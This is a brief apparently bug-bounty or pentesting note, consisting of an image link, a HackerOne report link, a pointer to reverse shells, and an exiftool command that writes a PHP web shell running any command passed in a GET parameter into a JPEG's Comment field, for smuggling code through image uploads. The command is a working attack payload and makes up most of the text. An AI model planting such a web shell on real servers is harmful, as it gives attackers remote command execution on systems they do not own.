![](https://miro.medium.com/max/875/1*ox8sx_Uhdc7F7o5OxKiFdw.png)

https://hackerone.com/reports/964550

Also see Reverse shell 
`exiftool -Comment="<?php echo shell_exec($_GET['cmd']); ?>" img.jpg`